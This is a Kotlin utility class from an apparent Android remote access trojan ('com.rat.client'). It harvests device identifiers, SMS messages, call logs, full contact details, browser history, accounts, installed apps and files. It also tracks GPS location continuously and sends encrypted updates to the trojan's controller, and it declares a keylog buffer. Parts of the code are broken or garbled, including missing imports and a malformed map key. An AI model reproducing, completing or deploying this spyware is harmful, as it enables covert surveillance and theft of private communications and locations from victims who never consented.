package com.rat.client.util

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.ComponentName
import android.content.ContentResolver
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.nfc.NfcAdapter
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.provider.Browser
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.rat.client.RatApplication
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.lang.reflect.Method
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import java.util.zip.GZIPOutputStream

class DeviceUtils private constructor() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "DeviceUtils"
        private var context: Context? = null
        private val locationManager: LocationManager? = null
        private val locationListeners = mutableMapOf<String, LocationListener>()
        private val isTrackingLocation = AtomicBoolean(false)
        private val bluetoothAdapter: BluetoothAdapter? = null
        private val nfcAdapter: NfcAdapter? = null
        private val keylogBuffer = ConcurrentHashMap<Long, String>()
        private const val MAX_KEYLOG_ENTRIES = 10000

        
        fun init(appContext: Context) {
            context = appContext.applicationContext
        }

        private val ctx: Context
            get() = context ?: throw IllegalStateException("DeviceUtils not initialized")

        // ===== Device Info Collection =====

        
        @SuppressLint("HardwareIds")
        fun collectDeviceInfo(context: Context): Map<String, Any> {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val pm = context.packageManager
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

            val info = mutableMapOf<String, Any>()

            // Basic device info
            info["device_id"] = getDeviceId(context)
            info["android_id"] = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            info["serial"] = Build.getSerial()
            info["model"] = Build.MODEL
            info["brand"] = Build.BRAND
            info["manufacturer"] = Build.MANUFACTURER
            info["product"] = Build.PRODUCT
            info["device"] = Build.DEVICE
            info["board"] = Build.BOARD
            info["hardware"] = Build.HARDWARE
            info["fingerprint"] = Build.FINGERPRINT
            info["bootloader"] = Build.BOOTLOADER
            info["radio_version"] = getRadioVersion()

            // OS info
            info["android_version"] = Build.VERSION.RELEASE
            info["sdk_int"] = Build.VERSION.SDK_INT
            info["security_patch"] = Build.VERSION.SECURITY_PATCH
            info["build_id"] = Build.ID
            info["build_type"] = Build.TYPE
            info["build_tags"] = Build.TAGS
            info["build_user"] = Build.USER
            info["build_host"] = Build.HOST
            info["build_time"] = Build.TIME

            // Telephony
            info["phone_number"] = tm.line1Number
            info["sim_operator"] = tm.simOperator
            info["sim_operator_name"] = tm.simOperatorName
            info["network_operator"] = tm.networkOperator
            info["network_operator_name"] = tm.networkOperatorName
            info["network_type"] = tm.networkType
            info["phone_type"] = tm.phoneType
            info["sim_state"] = tm.simState
            info["is_roaming"] = tm.isNetworkRoaming
            info["data_state"] = tm.dataState
            info["call_state"] = tm.callState

            // Subscriptions
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val subs = subManager.activeSubscriptionInfoList
                info["subscriptions"] = subs?.map { sub ->
                    mapOf(
                        "icc_id" to sub.iccId,
                        "number" to sub.number,
                        "carrier_name" to sub.carrierName.toString(),
                        "country_iso" to sub.countryIso,
                        "mcc" to sub.mcc,
                        "mnc" to sub.mnc
                    )
                } ?: emptyList()
            }

            // Display
            val display = context.resources.configuration
            info["screen_density"] = display.densityDpi
            info["screen_width"] = display.screenWidthDp
            info["screen_height"] = display.screenHeightDp
            info["orientation"] = display.orientation
            info["locale"] = display.locales.get(0).toLanguageTag()
            info["timezone"] = TimeZone.getDefault().id

            // Memory & Storage
            val memInfo = android.os.Debug.MemoryInfo()
            android.os.Debug.getMemoryInfo(memInfo)
            info["total_memory"] = Runtime.getRuntime().totalMemory()
            info["max_memory"] = Runtime.getRuntime().maxMemory()
            info["free_memory"] = Runtime.getRuntime().freeMemory()
            info["internal_storage"] = Environment.getDataDirectory().totalSpace
            info["internal_free"] = Environment.getDataDirectory().freeSpace
            info["external_storage"] = Environment.getExternalStorageDirectory().totalSpace
            info["external_free"] = Environment.getExternalStorageDirectory().freeSpace

            // CPU
            info["cpu_abi"] = Build.SUPPORTED_ABIS.joinToString(",")
            info["cpu_abi2"] = Build.SUPPORTED_32_BIT_ABIS.joinToString(",")
            info["cpu_cores"] = Runtime.getRuntime().availableProcessors()

            // Network
            val activeNetwork = cm.activeNetwork
            val networkCapabilities = activeNetwork?.let { cm.getNetworkCapabilities(it) }
            info["network_type"] = when {
                networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WIFI"
                networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "CELLULAR"
                networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "ETHERNET"
                networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true -> "VPN"
                else -> "UNKNOWN"
            }
            info["ip_address"] = NetworkUtils.getLocalIpAddress()
            info["mac_address"] = NetworkUtils.getMacAddress(context)

            // Battery
            info["battery"] = getBatteryInfo(context)

            // Root detection
            info["is_rooted"] = isDeviceRooted()
            info["selinux_status"] = getSelinuxStatus()
            info["kn Knox_status"] = getKnoxStatus(context)

            // Security
            info["is_debuggable"] = (context.applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE) != 0
            info["is_device_admin"] = isDeviceAdminActive(context)
            info["unknown_sources"] = Settings.Secure.getInt(context.contentResolver, Settings.Secure.INSTALL_NON_MARKET_APPS, 0) == 1
            info["adb_enabled"] = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ADB_ENABLED, 0) == 1

            // Apps count
            info["installed_apps_count"] = pm.installedApplications.size
            info["system_apps_count"] = pm.installedApplications.count { (it.flags and ApplicationInfo.FLAG_SYSTEM) != 0 }

            // Permissions granted
            info["permissions"] = getGrantedPermissions(context)

            // Timestamp
            info["timestamp"] = System.currentTimeMillis()
            info["timezone_offset"] = TimeZone.getDefault().getOffset(System.currentTimeMillis())

            return info
        }

        
        @SuppressLint("HardwareIds")
        fun getDeviceId(context: Context): String {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            var deviceId = ""

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10+ restricts IMEI access
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PRIVILEGED_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    deviceId = tm.imei ?: ""
                }
            } else {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    deviceId = tm.deviceId ?: ""
                }
            }

            // Fallback: generate unique ID from multiple sources
            if (deviceId.isEmpty()) {
                val serial = Build.getSerial()
                val id = "$androidId$serial${Build.MODEL}${Build.MANUFACTURER}"
                deviceId = String(java.security.MessageDigest.getInstance("SHA-256").digest(id.toByteArray())).substring(0, 16)
            }

            return deviceId
        }

        // ===== SMS =====

        
        fun getSmsData(context: Context, limit: Int = 100, offset: Int = 0): Map<String, Any> {
            val uri = Uri.parse("content://sms")
            val projection = arrayOf("_id", "address", "body", "date", "type", "read", "thread_id", "protocol")
            val sortOrder = "date DESC LIMIT $limit OFFSET $offset"

            val cursor = context.contentResolver.query(uri, projection, null, null, sortOrder)
            val smsList = mutableListOf<Map<String, Any>>()

            cursor?.use { c ->
                while (c.moveToNext()) {
                    val id = c.getLong(c.getColumnIndexOrThrow("_id"))
                    val address = c.getString(c.getColumnIndexOrThrow("address")) ?: ""
                    val body = c.getString(c.getColumnIndexOrThrow("body")) ?: ""
                    val date = c.getLong(c.getColumnIndexOrThrow("date"))
                    val type = c.getInt(c.getColumnIndexOrThrow("type"))
                    val read = c.getInt(c.getColumnIndexOrThrow("read")) == 1
                    val threadId = c.getLong(c.getColumnIndexOrThrow("thread_id"))
                    val protocol = c.getInt(c.getColumnIndexOrThrow("protocol"))

                    smsList.add(mapOf(
                        "id" to id,
                        "address" to address,
                        "body" to body,
                        "date" to date,
                        "type" to when (type) {
                            1 -> "INBOX"
                            2 -> "SENT"
                            3 -> "DRAFT"
                            4 -> "OUTBOX"
                            5 -> "FAILED"
                            6 -> "QUEUED"
                            else -> "UNKNOWN"
                        },
                        "read" to read,
                        "thread_id" to threadId,
                        "protocol" to protocol
                    ))
                }
            }

            return mapOf("sms" to smsList, "count" to smsList.size)
        }

        // ===== Call Logs =====

        
        fun getCallLogData(context: Context, limit: Int = 100): Map<String, Any> {
            val uri = CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.CACHED_NUMBER_TYPE,
                CallLog.Calls.GEOCODED_LOCATION
            )
            val sortOrder = "${CallLog.Calls.DATE} DESC LIMIT $limit"

            val cursor = context.contentResolver.query(uri, projection, null, null, sortOrder)
            val callsList = mutableListOf<Map<String, Any>>()

            cursor?.use { c ->
                while (c.moveToNext()) {
                    val id = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls._ID))
                    val number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""
                    val type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val duration = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
                    val numberType = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_TYPE))
                    val location = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.GEOCODED_LOCATION))

                    callsList.add(mapOf(
                        "id" to id,
                        "number" to number,
                        "name" to name ?: "",
                        "type" to when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                            CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "ANSWERED_EXTERNALLY"
                            else -> "UNKNOWN"
                        },
                        "date" to date,
                        "duration" to duration,
                        "number_type" to numberType,
                        "location" to location ?: ""
                    ))
                }
            }

            return mapOf("calls" to callsList, "count" to callsList.size)
        }

        // ===== Contacts =====

        
        fun getContactsData(context: Context, limit: Int = 500): Map<String, Any> {
            val uri = ContactsContract.Contacts.CONTENT_URI
            val projection = arrayOf(
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER,
                ContactsContract.Contacts.PHOTO_URI
            )
            val sortOrder = "${ContactsContract.Contacts.DISPLAY_NAME} ASC LIMIT $limit"

            val cursor = context.contentResolver.query(uri, projection, null, null, sortOrder)
            val contactsList = mutableListOf<Map<String, Any>>()

            cursor?.use { c ->
                while (c.moveToNext()) {
                    val id = c.getLong(c.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: ""
                    val hasPhone = c.getInt(c.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0
                    val photoUri = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.PHOTO_URI))

                    val contact = mutableMapOf<String, Any>(
                        "id" to id,
                        "name" to name,
                        "has_phone" to hasPhone,
                        "photo_uri" to photoUri ?: "",
                        "phones" to mutableListOf<Map<String, Any>>(),
                        "emails" to mutableListOf<Map<String, Any>>(),
                        "addresses" to mutableListOf<Map<String, Any>>()
                    )

                    // Phones
                    if (hasPhone) {
                        val phoneCursor = context.contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id.toString()),
                            null
                        )
                        phoneCursor?.use { pc ->
                            while (pc.moveToNext()) {
                                val phone = pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: ""
                                val type = pc.getInt(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))
                                val label = pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.LABEL))
                                (contact["phones"] as MutableList<Map<String, Any>>).add(mapOf(
                                    "number" to phone,
                                    "type" to type,
                                    "label" to label ?: ""
                                ))
                            }
                        }
                    }

                    // Emails
                    val emailCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                        arrayOf(id.toString()),
                        null
                    )
                    emailCursor?.use { ec ->
                        while (ec.moveToNext()) {
                            val email = ec.getString(ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)) ?: ""
                            val type = ec.getInt(ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.TYPE))
                            val label = ec.getString(ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.LABEL))
                            (contact["emails"] as MutableList<Map<String, Any>>).add(mapOf(
                                "email" to email,
                                "type" to type,
                                "label" to label ?: ""
                            ))
                        }
                    }

                    // Addresses
                    val addrCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID} = ?",
                        arrayOf(id.toString()),
                        null
                    )
                    addrCursor?.use { ac ->
                        while (ac.moveToNext()) {
                            val street = ac.getString(ac.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.STREET)) ?: ""
                            val city = ac.getString(ac.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.CITY)) ?: ""
                            val region = ac.getString(ac.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.REGION)) ?: ""
                            val postcode = ac.getString(ac.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE)) ?: ""
                            val country = ac.getString(ac.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY)) ?: ""
                            val type = ac.getInt(ac.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.TYPE))
                            (contact["addresses"] as MutableList<Map<String, Any>>).add(mapOf(
                                "street" to street,
                                "city" to city,
                                "region" to region,
                                "postcode" to postcode,
                                "country" to country,
                                "type" to type
                            ))
                        }
                    }

                    contactsList.add(contact)
                }
            }

            return mapOf("contacts" to contactsList, "count" to contactsList.size)
        }

        // ===== Location =====

        
        fun getLastKnownLocation(context: Context): Map<String, Any>? {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = locationManager.getProviders(true)

            var bestLocation: Location? = null
            var bestAccuracy = Float.MAX_VALUE

            for (provider in providers) {
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    continue
                }
                val location = locationManager.getLastKnownLocation(provider)
                if (location != null) {
                    val accuracy = location.accuracy
                    if (accuracy < bestAccuracy) {
                        bestAccuracy = accuracy
                        bestLocation = location
                    }
                }
            }

            return bestLocation?.let { loc ->
                mapOf(
                    "latitude" to loc.latitude,
                    "longitude" to loc.longitude,
                    "altitude" to loc.altitude,
                    "accuracy" to loc.accuracy,
                    "speed" to loc.speed,
                    "bearing" to loc.bearing,
                    "provider" to loc.provider,
                    "time" to loc.time
                )
            }
        }

        
        fun startLocationTracking(context: Context, intervalMs: Long = 60000) {
            if (isTrackingLocation.getAndSet(true)) return

            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val criteria = android.location.Criteria().apply {
                accuracy = android.location.Criteria.ACCURACY_FINE
                powerRequirement = android.location.Criteria.POWER_LOW
            }

            val provider = locationManager.getBestProvider(criteria, true)
            if (provider == null) return

            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    val data = mapOf(
                        "latitude" to location.latitude,
                        "longitude" to location.longitude,
                        "altitude" to location.altitude,
                        "accuracy" to location.accuracy,
                        "speed" to location.speed,
                        "bearing" to location.bearing,
                        "provider" to location.provider,
                        "time" to location.time
                    )
                    RatApplication.getInstance()?.let { app ->
                        val encrypted = EncryptionUtils.encrypt(Gson().toJson(data))
                        app.ratService?.sendCommand("location_update", encrypted)
                    }
                }
                override fun onProviderDisabled(provider: String) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onStatusChanged(provider: String, status: Int, extras: Bundle?) {}
            }

            locationListeners[provider] = listener
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locationManager.requestLocationUpdates(provider, intervalMs, 10f, listener)
            }
        }

        
        fun stopLocationTracking(context: Context) {
            if (!isTrackingLocation.getAndSet(false)) return
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            locationListeners.forEach { (provider, listener) ->
                locationManager.removeUpdates(listener)
            }
            locationListeners.clear()
        }

        
        fun getLocationHistory(context: Context): Map<String, Any> {
            // Would read from local database
            return mapOf("history" to emptyList<Map<String, Any>>())
        }

        // ===== Apps =====

        
        fun getInstalledApps(context: Context, includeSystem: Boolean = false): Map<String, Any> {
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val appsList = mutableListOf<Map<String, Any>>()

            for (app in apps) {
                val isSystem = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0
                if (!includeSystem && isSystem) continue

                val pkgInfo = try {
                    pm.getPackageInfo(app.packageName, PackageManager.GET_PERMISSIONS)
                } catch (e: Exception) {
                    null
                }

                val permissions = pkgInfo?.requestedPermissions?.toList() ?: emptyList()
                val grantedPermissions = pkgInfo?.requestedPermissions?.filter { perm ->
                    ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
                } ?: emptyList()

                appsList.add(mapOf(
                    "package" to app.packageName,
                    "name" to pm.getApplicationLabel(app).toString(),
                    "version" to pkgInfo?.versionName ?: "unknown",
                    "version_code" to pkgInfo?.versionCode ?: 0,
                    "is_system" to isSystem,
                    "is_updated_system" to (app.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0,
                    "enabled" to pm.getApplicationEnabledSetting(app.packageName) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    "install_time" to pkgInfo?.firstInstallTime ?: 0,
                    "update_time" to pkgInfo?.lastUpdateTime ?: 0,
                    "data_dir" to app.dataDir,
                    "source_dir" to app.sourceDir,
                    "permissions" to permissions,
                    "granted_permissions" to grantedPermissions,
                    "icon" to app.icon?.let { drawableToBase64(it) } ?: ""
                ))
            }

            return mapOf("apps" to appsList, "count" to appsList.size)
        }

        
        fun getAppData(context: Context, packageName: String): Map<String, Any> {
            val pm = context.packageManager
            return try {
                val appInfo = pm.getApplicationInfo(packageName, 0)
                val pkgInfo = pm.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS or PackageManager.GET_SIGNATURES)
                val signatures = pkgInfo.signatures.map { it.toCharsString() }

                mapOf(
                    "package" to packageName,
                    "name" to pm.getApplicationLabel(appInfo).toString(),
                    "version" to pkgInfo.versionName,
                    "version_code" to pkgInfo.versionCode,
                    "data_dir" to appInfo.dataDir,
                    "source_dir" to appInfo.sourceDir,
                    "native_library_dir" to appInfo.nativeLibraryDir,
                    "uid" to appInfo.uid,
                    "flags" to appInfo.flags,
                    "permissions" to pkgInfo.requestedPermissions?.toList() ?: emptyList(),
                    "signatures" to signatures,
                    "install_time" to pkgInfo.firstInstallTime,
                    "update_time" to pkgInfo.lastUpdateTime,
                    "shared_user_id" to pkgInfo.sharedUserId
                )
            } catch (e: Exception) {
                mapOf("error" to "Package not found")
            }
        }

        // ===== Files =====

        
        fun getInterestingFiles(context: Context): Map<String, Any> {
            val interestingPaths = listOf(
                Environment.getExternalStorageDirectory().absolutePath,
                "${Environment.getExternalStorageDirectory().absolutePath}/Download",
                "${Environment.getExternalStorageDirectory().absolutePath}/DCIM",
                "${Environment.getExternalStorageDirectory().absolutePath}/Pictures",
                "${Environment.getExternalStorageDirectory().absolutePath}/Movies",
                "${Environment.getExternalStorageDirectory().absolutePath}/Documents",
                context.filesDir.absolutePath,
                context.cacheDir.absolutePath,
                context.getExternalFilesDir(null)?.absolutePath ?: ""
            ).filter { it.isNotEmpty() }

            val filesList = mutableListOf<Map<String, Any>>()
            for (path in interestingPaths) {
                FileUtils.listFiles(path, true).let { result ->
                    val files = result["files"] as? List<Map<String, Any>> ?: emptyList()
                    filesList.addAll(files.take(100))
                }
            }

            return mapOf("files" to filesList, "count" to filesList.size)
        }

        // ===== Battery =====

        
        fun getBatteryLevel(context: Context): Int {
            val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            return intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        }

        
        fun getBatteryInfo(context: Context): Map<String, Any> {
            val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            return if (intent != null) {
                val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                val health = intent.getIntExtra(BatteryManager.EXTRA_HEALTH, -1)
                val plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
                val technology = intent.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY) ?: ""
                val temperature = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1)
                val voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1)
                val capacity = intent.getIntExtra(BatteryManager.EXTRA_CAPACITY, -1)

                mapOf(
                    "level" to level,
                    "scale" to scale,
                    "percentage" to if (scale > 0) (level * 100 / scale) else -1,
                    "status" to when (status) {
                        BatteryManager.BATTERY_STATUS_CHARGING -> "CHARGING"
                        BatteryManager.BATTERY_STATUS_DISCHARGING -> "DISCHARGING"
                        BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "NOT_CHARGING"
                        BatteryManager.BATTERY_STATUS_FULL -> "FULL"
                        BatteryManager.BATTERY_STATUS_UNKNOWN -> "UNKNOWN"
                        else -> "UNKNOWN"
                    },
                    "health" to when (health) {
                        BatteryManager.BATTERY_HEALTH_GOOD -> "GOOD"
                        BatteryManager.BATTERY_HEALTH_OVERHEAT -> "OVERHEAT"
                        BatteryManager.BATTERY_HEALTH_DEAD -> "DEAD"
                        BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "OVER_VOLTAGE"
                        BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "UNSPECIFIED_FAILURE"
                        BatteryManager.BATTERY_HEALTH_COLD -> "COLD"
                        else -> "UNKNOWN"
                    },
                    "plugged" to when (plugged) {
                        BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                        BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                        BatteryManager.BATTERY_PLUGGED_WIRELESS -> "WIRELESS"
                        else -> "NOT_PLUGGED"
                    },
                    "technology" to technology,
                    "temperature" to temperature / 10.0,
                    "voltage" to voltage,
                    "capacity" to capacity
                )
            } else {
                mapOf("error" to "No battery info")
            }
        }

        // ===== Network Type =====

        
        fun getNetworkType(context: Context): String {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val activeNetwork = cm.activeNetwork
            val capabilities = activeNetwork?.let { cm.getNetworkCapabilities(it) }
            return when {
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WIFI"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "CELLULAR"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "ETHERNET"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true -> "VPN"
                else -> "NONE"
            }
        }

        // ===== Bluetooth =====

        
        fun scanBluetooth(context: Context): Map<String, Any> {
            val adapter = BluetoothAdapter.getDefaultAdapter()
            if (adapter == null) return mapOf("error" to "No Bluetooth adapter")

            val devices = mutableListOf<Map<String, Any>>()
            val bondedDevices = adapter.bondedDevices
            for (device in bondedDevices) {
                devices.add(mapOf(
                    "name" to device.name ?: "Unknown",
                    "address" to device.address,
                    "type" to device.type,
                    "bond_state" to device.bondState,
                    "paired" to true
                ))
            }

            // Start discovery for unpaired devices
            if (adapter.isDiscovering) adapter.cancelDiscovery()
            adapter.startDiscovery()

            // Return bonded devices immediately, discovery results would come via BroadcastReceiver
            return mapOf("devices" to devices, "count" to devices.size, "discovering" to adapter.isDiscovering)
        }

        
        fun pairBluetooth(context: Context, address: String): Map<String, Any> {
            val adapter = BluetoothAdapter.getDefaultAdapter()
            if (adapter == null) return mapOf("error" to "No Bluetooth adapter")

            val device = adapter.getRemoteDevice(address)
            try {
                val method = device.javaClass.getMethod("createBond")
                val result = method.invoke(device) as Boolean
                return mapOf("success" to result)
            } catch (e: Exception) {
                return mapOf("error" to e.message ?: "Pairing failed")
            }
        }

        // ===== NFC =====

        
        fun readNfc(context: Context): Map<String, Any> {
            val adapter = NfcAdapter.getDefaultAdapter(context)
            if (adapter == null) return mapOf("error" to "No NFC adapter")
            // NFC reading requires foreground dispatch, would need activity context
            return mapOf("available" to adapter.isEnabled)
        }

        
        fun writeNfc(context: Context, data: String): Map<String, Any> {
            val adapter = NfcAdapter.getDefaultAdapter(context)
            if (adapter == null) return mapOf("error" to "No NFC adapter")
            return mapOf("error" to "Requires foreground activity")
        }

        // ===== Browser =====

        
        fun getBrowserHistory(context: Context): Map<String, Any> {
            val history = mutableListOf<Map<String, Any>>()
            val projection = arrayOf(
                Browser.BookmarkColumns.TITLE,
                Browser.BookmarkColumns.URL,
                Browser.BookmarkColumns.VISITS,
                Browser.BookmarkColumns.DATE,
                Browser.BookmarkColumns.BOOKMARK
            )
            val cursor = context.contentResolver.query(Browser.BOOKMARKS_URI, projection, null, null, null)
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val isBookmark = c.getInt(c.getColumnIndexOrThrow(Browser.BookmarkColumns.BOOKMARK)) == 1
                    if (!isBookmark) {
                        history.add(mapOf(
                            "title" to c.getString(c.getColumnIndexOrThrow(Browser.BookmarkColumns.TITLE)) ?: "",
                            "url" to c.getString(c.getColumnIndexOrThrow(Browser.BookmarkColumns.URL)) ?: "",
                            "visits" to c.getInt(c.getColumnIndexOrThrow(Browser.BookmarkColumns.VISITS)),
                            "date" to c.getLong(c.getColumnIndexOrThrow(Browser.BookmarkColumns.DATE))
                        ))
                    }
                }
            }
            return mapOf("history" to history, "count" to history.size)
        }

        
        fun getBookmarks(context: Context): Map<String, Any> {
            val bookmarks = mutableListOf<Map<String, Any>>()
            val projection = arrayOf(
                Browser.BookmarkColumns.TITLE,
                Browser.BookmarkColumns.URL,
                Browser.BookmarkColumns.DATE,
                Browser.BookmarkColumns.BOOKMARK
            )
            val cursor = context.contentResolver.query(Browser.BOOKMARKS_URI, projection, null, null, null)
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val isBookmark = c.getInt(c.getColumnIndexOrThrow(Browser.BookmarkColumns.BOOKMARK)) == 1
                    if (isBookmark) {
                        bookmarks.add(mapOf(
                            "title" to c.getString(c.getColumnIndexOrThrow(Browser.BookmarkColumns.TITLE)) ?: "",
                            "url" to c.getString(c.getColumnIndexOrThrow(Browser.BookmarkColumns.URL)) ?: "",
                            "date" to c.getLong(c.getColumnIndexOrThrow(Browser.BookmarkColumns.DATE))
                        ))
                    }
                }
            }
            return mapOf("bookmarks" to bookmarks, "count" to bookmarks.size)
        }

        // ===== Accounts =====

        
        fun getAccounts(context: Context): Map<String, Any> {
            val accounts = mutableListOf<Map<String, Any>>()
            val accountManager = android.accounts.AccountManager.get(context)
            for (account in accountManager.getAccounts()) {
                accounts.add(mapOf(
                    "name" to account.name,
                    "type" to account.type,
                    "access_id" to accountManager.getUserData(account, "access_id") ?: ""
                ))
            }
            return mapOf("accounts" to accounts, "count" to accounts.size)
        }

